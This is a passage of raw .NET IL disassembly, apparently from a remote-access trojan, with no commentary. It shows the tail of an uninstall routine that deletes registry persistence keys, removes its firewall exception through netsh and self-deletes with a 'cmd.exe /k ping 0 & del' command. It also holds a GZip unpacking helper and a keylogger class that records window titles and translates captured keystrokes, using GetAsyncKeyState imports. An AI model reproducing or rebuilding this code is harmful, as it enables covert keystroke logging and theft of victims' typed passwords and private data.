      IL_0070:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0075:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_007a:  ldsfld     string w.OK::sf
      IL_007f:  ldc.i4.1
      IL_0080:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0085:  ldsfld     string w.OK::RG
      IL_008a:  ldc.i4.0
      IL_008b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0090:  nop
      IL_0091:  leave.s    IL_00a2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0093:  dup
      IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0099:  stloc.2
      IL_009a:  nop
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a0:  leave.s    IL_00a2

    }  // end handler
    IL_00a2:  nop
    IL_00a3:  nop
    .try
    {
      IL_00a4:  ldstr      "netsh firewall delete allowedprogram \""
      IL_00a9:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_00ae:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b3:  ldstr      "\""
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  ldc.i4.0
      IL_00be:  ldc.i4.0
      IL_00bf:  ldc.i4.m1
      IL_00c0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00c5:  pop
      IL_00c6:  leave.s    IL_00d7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c8:  dup
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ce:  stloc.3
      IL_00cf:  nop
      IL_00d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d5:  leave.s    IL_00d7

    }  // end handler
    IL_00d7:  nop
    IL_00d8:  nop
    .try
    {
      IL_00d9:  ldsfld     class [mscorlib]System.IO.FileStream w.OK::FS
      IL_00de:  ldnull
      IL_00df:  ceq
      IL_00e1:  ldc.i4.0
      IL_00e2:  ceq
      IL_00e4:  stloc.s    VB$CG$t_bool$S0
      IL_00e6:  ldloc.s    VB$CG$t_bool$S0
      IL_00e8:  brfalse.s  IL_0125

      IL_00ea:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_00ef:  ldc.i4     0x80
      IL_00f4:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_00f9:  nop
      IL_00fa:  ldsfld     class [mscorlib]System.IO.FileStream w.OK::FS
      IL_00ff:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0104:  nop
      IL_0105:  ldc.i4.7
      IL_0106:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_010b:  ldstr      "\\"
      IL_0110:  ldsfld     string w.OK::RG
      IL_0115:  ldstr      ".exe"
      IL_011a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_011f:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0124:  nop
      IL_0125:  nop
      IL_0126:  leave.s    IL_0138

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0128:  dup
      IL_0129:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012e:  stloc.s    V_4
      IL_0130:  nop
      IL_0131:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0136:  leave.s    IL_0138

    }  // end handler
    IL_0138:  nop
    IL_0139:  nop
    .try
    {
      IL_013a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_013f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0144:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0149:  ldstr      "Software"
      IL_014e:  ldc.i4.1
      IL_014f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0154:  ldsfld     string w.OK::RG
      IL_0159:  ldc.i4.0
      IL_015a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_015f:  nop
      IL_0160:  leave.s    IL_0172

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0162:  dup
      IL_0163:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0168:  stloc.s    V_5
      IL_016a:  nop
      IL_016b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0170:  leave.s    IL_0172

    }  // end handler
    IL_0172:  nop
    IL_0173:  nop
    .try
    {
      IL_0174:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0179:  ldc.i4     0x80
      IL_017e:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_0183:  nop
      IL_0184:  ldstr      "cmd.exe /k ping 0 & del \""
      IL_0189:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_018e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0193:  ldstr      "\" & exit"
      IL_0198:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_019d:  ldc.i4.0
      IL_019e:  ldc.i4.0
      IL_019f:  ldc.i4.m1
      IL_01a0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01a5:  pop
      IL_01a6:  leave.s    IL_01b8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01a8:  dup
      IL_01a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ae:  stloc.s    V_6
      IL_01b0:  nop
      IL_01b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b6:  leave.s    IL_01b8

    }  // end handler
    IL_01b8:  nop
    IL_01b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01be:  nop
    IL_01bf:  nop
    IL_01c0:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       116 (0x74)
    .maxstack  4
    .locals init ([0] uint8[] array1,
             [1] uint8[] array2,
             [2] class [System]System.IO.Compression.GZipStream gzipstream1,
             [3] class [mscorlib]System.IO.MemoryStream memorystream1,
             [4] int32 num1,
             [5] uint8[] ZIP)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0007:  stloc.3
    IL_0008:  ldloc.3
    IL_0009:  ldc.i4.0
    IL_000a:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000f:  stloc.2
    IL_0010:  ldc.i4.4
    IL_0011:  newarr     [mscorlib]System.Byte
    IL_0016:  stloc.1
    IL_0017:  ldloc.3
    IL_0018:  ldloc.3
    IL_0019:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001e:  ldc.i4.5
    IL_001f:  conv.i8
    IL_0020:  sub.ovf
    IL_0021:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0026:  nop
    IL_0027:  ldloc.3
    IL_0028:  ldloc.1
    IL_0029:  ldc.i4.0
    IL_002a:  ldc.i4.4
    IL_002b:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0030:  pop
    IL_0031:  ldloc.1
    IL_0032:  ldc.i4.0
    IL_0033:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0038:  stloc.s    num1
    IL_003a:  ldloc.3
    IL_003b:  ldc.i4.0
    IL_003c:  conv.i8
    IL_003d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0042:  nop
    IL_0043:  ldloc.s    num1
    IL_0045:  ldc.i4.1
    IL_0046:  sub.ovf
    IL_0047:  ldc.i4.1
    IL_0048:  add.ovf
    IL_0049:  ldc.i4.1
    IL_004a:  sub.ovf
    IL_004b:  ldc.i4.1
    IL_004c:  add.ovf
    IL_004d:  newarr     [mscorlib]System.Byte
    IL_0052:  stloc.0
    IL_0053:  ldloc.2
    IL_0054:  ldloc.0
    IL_0055:  ldc.i4.0
    IL_0056:  ldloc.s    num1
    IL_0058:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_005d:  pop
    IL_005e:  ldloc.2
    IL_005f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0064:  nop
    IL_0065:  ldloc.3
    IL_0066:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006b:  nop
    IL_006c:  ldloc.0
    IL_006d:  stloc.s    ZIP
    IL_006f:  br.s       IL_0071

    IL_0071:  ldloc.s    ZIP
    IL_0073:  ret
  } // end of method OK::ZIP

} // end of class w.OK

.class public auto ansi w.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       38 (0x26)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys w.kl::lastKey
    IL_000e:  ldarg.0
    IL_000f:  ldstr      ""
    IL_0014:  stfld      string w.kl::Logs
    IL_0019:  ldarg.0
    IL_001a:  ldstr      "[kl]"
    IL_001f:  stfld      string w.kl::vn
    IL_0024:  nop
    IL_0025:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       252 (0xfc)
    .maxstack  4
    .locals init ([0] string AV,
             [1] native int foregroundWindow,
             [2] int32 num,
             [3] class [System]System.Diagnostics.Process processById,
             [4] class [mscorlib]System.Exception exception,
             [5] class [mscorlib]System.Exception exception1,
             [6] valuetype [mscorlib]System.DateTime VB$t_date$S0,
             [7] string[] VB$t_array$S0,
             [8] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int w.OK::GetForegroundWindow()
      IL_0007:  stloc.1
      IL_0008:  ldloc.1
      IL_0009:  ldloca.s   num
      IL_000b:  call       int32 w.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0010:  pop
      IL_0011:  ldloc.2
      IL_0012:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0017:  stloc.3
      IL_0018:  ldloca.s   foregroundWindow
      IL_001a:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001f:  ldarg.0
      IL_0020:  ldfld      int32 w.kl::LastAV
      IL_0025:  ceq
      IL_0027:  ldarg.0
      IL_0028:  ldfld      string w.kl::LastAS
      IL_002d:  ldloc.3
      IL_002e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0033:  ldc.i4.0
      IL_0034:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0039:  ldc.i4.0
      IL_003a:  ceq
      IL_003c:  and
      IL_003d:  ldloc.3
      IL_003e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0043:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0048:  ldc.i4.0
      IL_0049:  ceq
      IL_004b:  or
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  stloc.s    VB$CG$t_bool$S0
      IL_0051:  ldloc.s    VB$CG$t_bool$S0
      IL_0053:  brfalse.s  IL_00cc

      IL_0055:  ldarg.0
      IL_0056:  ldloca.s   foregroundWindow
      IL_0058:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_005d:  stfld      int32 w.kl::LastAV
      IL_0062:  ldarg.0
      IL_0063:  ldloc.3
      IL_0064:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0069:  stfld      string w.kl::LastAS
      IL_006e:  ldc.i4.6
      IL_006f:  newarr     [mscorlib]System.String
      IL_0074:  stloc.s    VB$t_array$S0
      IL_0076:  ldloc.s    VB$t_array$S0
      IL_0078:  ldc.i4.0
      IL_0079:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007e:  stelem.ref
      IL_007f:  nop
      IL_0080:  ldloc.s    VB$t_array$S0
      IL_0082:  ldc.i4.1
      IL_0083:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_0088:  stloc.s    VB$t_date$S0
      IL_008a:  ldloca.s   VB$t_date$S0
      IL_008c:  ldstr      "yy/MM/dd "
      IL_0091:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0096:  stelem.ref
      IL_0097:  nop
      IL_0098:  ldloc.s    VB$t_array$S0
      IL_009a:  ldc.i4.2
      IL_009b:  ldloc.3
      IL_009c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_00a1:  stelem.ref
      IL_00a2:  nop
      IL_00a3:  ldloc.s    VB$t_array$S0
      IL_00a5:  ldc.i4.3
      IL_00a6:  ldstr      " "
      IL_00ab:  stelem.ref
      IL_00ac:  nop
      IL_00ad:  ldloc.s    VB$t_array$S0
      IL_00af:  ldc.i4.4
      IL_00b0:  ldarg.0
      IL_00b1:  ldfld      string w.kl::LastAS
      IL_00b6:  stelem.ref
      IL_00b7:  nop
      IL_00b8:  ldloc.s    VB$t_array$S0
      IL_00ba:  ldc.i4.5
      IL_00bb:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00c0:  stelem.ref
      IL_00c1:  nop
      IL_00c2:  ldloc.s    VB$t_array$S0
      IL_00c4:  call       string [mscorlib]System.String::Concat(string[])
      IL_00c9:  stloc.0
      IL_00ca:  leave.s    IL_00fa

      IL_00cc:  nop
      IL_00cd:  leave.s    IL_00f1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00cf:  dup
      IL_00d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d5:  stloc.s    exception1
      IL_00d7:  nop
      IL_00d8:  ldloc.s    exception1
      IL_00da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00df:  nop
      IL_00e0:  ldloc.s    exception1
      IL_00e2:  stloc.s    exception
      IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e9:  nop
      IL_00ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ef:  leave.s    IL_00f1

    }  // end handler
    IL_00f1:  nop
    IL_00f2:  ldstr      ""
    IL_00f7:  stloc.0
    IL_00f8:  br.s       IL_00fa

    IL_00fa:  ldloc.0
    IL_00fb:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       594 (0x252)
    .maxstack  3
    .locals init ([0] string Fix,
             [1] bool shiftKeyDown,
             [2] string str,
             [3] class [mscorlib]System.Exception exception,
             [4] class [mscorlib]System.Exception exception1,
             [5] valuetype [System.Windows.Forms]System.Windows.Forms.Keys VB$t_i4$L0,
             [6] char VB$t_char$S0,
             [7] bool VB$CG$t_bool$S0,
             [8] bool VB$CG$t_bool$S1)
    IL_0000:  nop
    IL_0001:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
    IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_0010:  stloc.1
    IL_0011:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
    IL_0016:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0020:  stloc.s    VB$CG$t_bool$S0
    IL_0022:  ldloc.s    VB$CG$t_bool$S0
    IL_0024:  brfalse.s  IL_0035

    IL_0026:  ldloc.1
    IL_0027:  stloc.s    VB$CG$t_bool$S1
    IL_0029:  ldloc.s    VB$CG$t_bool$S1
    IL_002b:  brfalse.s  IL_0031

    IL_002d:  ldc.i4.0
    IL_002e:  stloc.1
    IL_002f:  br.s       IL_0034

    IL_0031:  nop
    IL_0032:  ldc.i4.1
    IL_0033:  stloc.1
    IL_0034:  nop
    IL_0035:  nop
    IL_0036:  nop
    .try
    {
      IL_0037:  nop
      IL_0038:  ldarg.1
      IL_0039:  stloc.s    VB$t_i4$L0
      IL_003b:  nop
      IL_003c:  ldloc.s    VB$t_i4$L0
      IL_003e:  ldc.i4.s   46
      IL_0040:  beq.s      IL_004a

      IL_0042:  ldloc.s    VB$t_i4$L0
      IL_0044:  ldc.i4.8
      IL_0045:  beq.s      IL_004a

      IL_0047:  ldc.i4.0
      IL_0048:  br.s       IL_004b

      IL_004a:  ldc.i4.1
      IL_004b:  stloc.s    VB$CG$t_bool$S1
      IL_004d:  ldloc.s    VB$CG$t_bool$S1
      IL_004f:  brfalse.s  IL_0076

      IL_0051:  ldstr      "["
      IL_0056:  ldarg.1
      IL_0057:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_005c:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_0061:  ldstr      "]"
      IL_0066:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006b:  stloc.0
      IL_006c:  leave      IL_0250

      IL_0071:  br         IL_01c7

      IL_0076:  nop
      IL_0077:  ldloc.s    VB$t_i4$L0
      IL_0079:  ldc.i4     0xa0
      IL_007e:  beq.s      IL_0089

      IL_0080:  ldloc.s    VB$t_i4$L0
      IL_0082:  ldc.i4     0xa1
      IL_0087:  bne.un.s   IL_008b

      IL_0089:  br.s       IL_0094

      IL_008b:  ldloc.s    VB$t_i4$L0
      IL_008d:  ldc.i4     0x10000
      IL_0092:  bne.un.s   IL_0096

      IL_0094:  br.s       IL_009c

      IL_0096:  ldloc.s    VB$t_i4$L0
      IL_0098:  ldc.i4.s   16
      IL_009a:  bne.un.s   IL_009e

      IL_009c:  br.s       IL_00a7

      IL_009e:  ldloc.s    VB$t_i4$L0
      IL_00a0:  ldc.i4     0x20000
      IL_00a5:  bne.un.s   IL_00a9

      IL_00a7:  br.s       IL_00af

      IL_00a9:  ldloc.s    VB$t_i4$L0
      IL_00ab:  ldc.i4.s   17
      IL_00ad:  bne.un.s   IL_00b1

      IL_00af:  br.s       IL_00ba

      IL_00b1:  ldloc.s    VB$t_i4$L0
      IL_00b3:  ldc.i4     0xa3
      IL_00b8:  bne.un.s   IL_00bc

      IL_00ba:  br.s       IL_00c5

      IL_00bc:  ldloc.s    VB$t_i4$L0
      IL_00be:  ldc.i4     0xa2
      IL_00c3:  bne.un.s   IL_00c7

      IL_00c5:  br.s       IL_00d0

      IL_00c7:  ldloc.s    VB$t_i4$L0
      IL_00c9:  ldc.i4     0x40000
      IL_00ce:  bne.un.s   IL_00d2

      IL_00d0:  br.s       IL_00d8

      IL_00d2:  ldloc.s    VB$t_i4$L0
      IL_00d4:  ldc.i4.s   112
      IL_00d6:  bne.un.s   IL_00da

      IL_00d8:  br.s       IL_00e0

      IL_00da:  ldloc.s    VB$t_i4$L0
      IL_00dc:  ldc.i4.s   113
      IL_00de:  bne.un.s   IL_00e2

      IL_00e0:  br.s       IL_00e8

      IL_00e2:  ldloc.s    VB$t_i4$L0
      IL_00e4:  ldc.i4.s   114
      IL_00e6:  bne.un.s   IL_00ea

      IL_00e8:  br.s       IL_00f0

      IL_00ea:  ldloc.s    VB$t_i4$L0
      IL_00ec:  ldc.i4.s   115
      IL_00ee:  bne.un.s   IL_00f2

      IL_00f0:  br.s       IL_00f8

      IL_00f2:  ldloc.s    VB$t_i4$L0
      IL_00f4:  ldc.i4.s   116
      IL_00f6:  bne.un.s   IL_00fa

      IL_00f8:  br.s       IL_0100

      IL_00fa:  ldloc.s    VB$t_i4$L0
      IL_00fc:  ldc.i4.s   117
      IL_00fe:  bne.un.s   IL_0102

      IL_0100:  br.s       IL_0108

      IL_0102:  ldloc.s    VB$t_i4$L0
      IL_0104:  ldc.i4.s   118
      IL_0106:  bne.un.s   IL_010a

      IL_0108:  br.s       IL_0110

      IL_010a:  ldloc.s    VB$t_i4$L0
      IL_010c:  ldc.i4.s   119
      IL_010e:  bne.un.s   IL_0112

      IL_0110:  br.s       IL_0118

      IL_0112:  ldloc.s    VB$t_i4$L0
      IL_0114:  ldc.i4.s   120
      IL_0116:  bne.un.s   IL_011a

      IL_0118:  br.s       IL_0120

      IL_011a:  ldloc.s    VB$t_i4$L0
      IL_011c:  ldc.i4.s   121
      IL_011e:  bne.un.s   IL_0122

      IL_0120:  br.s       IL_0128

      IL_0122:  ldloc.s    VB$t_i4$L0
      IL_0124:  ldc.i4.s   122
      IL_0126:  bne.un.s   IL_012a

      IL_0128:  br.s       IL_0130

      IL_012a:  ldloc.s    VB$t_i4$L0
      IL_012c:  ldc.i4.s   123
      IL_012e:  bne.un.s   IL_0132

      IL_0130:  br.s       IL_013b

      IL_0132:  ldloc.s    VB$t_i4$L0
      IL_0134:  ldc.i4.s   35
      IL_0136:  beq.s      IL_013b

      IL_0138:  ldc.i4.0
      IL_0139:  br.s       IL_013c

      IL_013b:  ldc.i4.1
      IL_013c:  stloc.s    VB$CG$t_bool$S1
      IL_013e:  ldloc.s    VB$CG$t_bool$S1
      IL_0140:  brfalse.s  IL_014f

      IL_0142:  ldstr      ""
      IL_0147:  stloc.0
      IL_0148:  leave      IL_0250

      IL_014d:  br.s       IL_01c7

      IL_014f:  nop
      IL_0150:  ldloc.s    VB$t_i4$L0
      IL_0152:  ldc.i4.s   32
      IL_0154:  ceq
      IL_0156:  stloc.s    VB$CG$t_bool$S1
      IL_0158:  ldloc.s    VB$CG$t_bool$S1
      IL_015a:  brfalse.s  IL_0169

      IL_015c:  ldstr      " "
      IL_0161:  stloc.0
      IL_0162:  leave      IL_0250

      IL_0167:  br.s       IL_01c7

      IL_0169:  nop
      IL_016a:  ldloc.s    VB$t_i4$L0
      IL_016c:  ldc.i4.s   13
      IL_016e:  beq.s      IL_0179

      IL_0170:  ldloc.s    VB$t_i4$L0
      IL_0172:  ldc.i4.s   13
      IL_0174:  beq.s      IL_0179

      IL_0176:  ldc.i4.0
      IL_0177:  br.s       IL_017a

      IL_0179:  ldc.i4.1
      IL_017a:  stloc.s    VB$CG$t_bool$S1
      IL_017c:  ldloc.s    VB$CG$t_bool$S1
      IL_017e:  brfalse.s  IL_01af

      IL_0180:  ldarg.0
      IL_0181:  ldfld      string w.kl::Logs
      IL_0186:  ldstr      "[ENTER]\r\n"
      IL_018b:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0190:  stloc.s    VB$CG$t_bool$S0
      IL_0192:  ldloc.s    VB$CG$t_bool$S0
      IL_0194:  brfalse.s  IL_01a1

      IL_0196:  ldstr      ""
      IL_019b:  stloc.0
      IL_019c:  leave      IL_0250

      IL_01a1:  nop
      IL_01a2:  ldstr      "[ENTER]\r\n"
      IL_01a7:  stloc.0
      IL_01a8:  leave      IL_0250

      IL_01ad:  br.s       IL_01c7

      IL_01af:  nop
      IL_01b0:  ldloc.s    VB$t_i4$L0
      IL_01b2:  ldc.i4.s   9
      IL_01b4:  ceq
      IL_01b6:  stloc.s    VB$CG$t_bool$S1
      IL_01b8:  ldloc.s    VB$CG$t_bool$S1
      IL_01ba:  brfalse.s  IL_01c7

      IL_01bc:  ldstr      "[TAP]\r\n"
      IL_01c1:  stloc.0
      IL_01c2:  leave      IL_0250

      IL_01c7:  nop
      IL_01c8:  ldloc.1
      IL_01c9:  stloc.s    VB$CG$t_bool$S1
      IL_01cb:  ldloc.s    VB$CG$t_bool$S1
      IL_01cd:  brfalse.s  IL_01de

      IL_01cf:  ldarg.1
      IL_01d0:  conv.ovf.u4
      IL_01d1:  call       string w.kl::VKCodeToUnicode(uint32)
      IL_01d6:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_01db:  stloc.0
      IL_01dc:  leave.s    IL_0250

      IL_01de:  nop
      IL_01df:  ldarg.1
      IL_01e0:  conv.ovf.u4
      IL_01e1:  call       string w.kl::VKCodeToUnicode(uint32)
      IL_01e6:  stloc.2
      IL_01e7:  leave.s    IL_024b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e9:  dup
      IL_01ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ef:  stloc.s    exception1
      IL_01f1:  nop
      IL_01f2:  ldloc.s    exception1
      IL_01f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f9:  nop
      IL_01fa:  ldloc.s    exception1
      IL_01fc:  stloc.3
      IL_01fd:  ldloc.1
      IL_01fe:  stloc.s    VB$CG$t_bool$S1
      IL_0200:  ldloc.s    VB$CG$t_bool$S1
      IL_0202:  brfalse.s  IL_0228

      IL_0204:  ldarg.1
      IL_0205:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_020a:  stloc.s    VB$t_char$S0
      IL_020c:  ldloca.s   VB$t_char$S0
      IL_020e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0213:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0218:  stloc.2
      IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021e:  nop
      IL_021f:  ldloc.2
      IL_0220:  stloc.0
      IL_0221:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0226:  leave.s    IL_0250

      IL_0228:  nop
      IL_0229:  ldarg.1
      IL_022a:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_022f:  stloc.s    VB$t_char$S0
      IL_0231:  ldloca.s   VB$t_char$S0
      IL_0233:  call       instance string [mscorlib]System.Char::ToString()
      IL_0238:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_023d:  stloc.2
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0243:  nop
      IL_0244:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0249:  leave.s    IL_024b

    }  // end handler
    IL_024b:  nop
    IL_024c:  ldloc.2
    IL_024d:  stloc.0
    IL_024e:  br.s       IL_0250

    IL_0250:  ldloc.0
    IL_0251:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
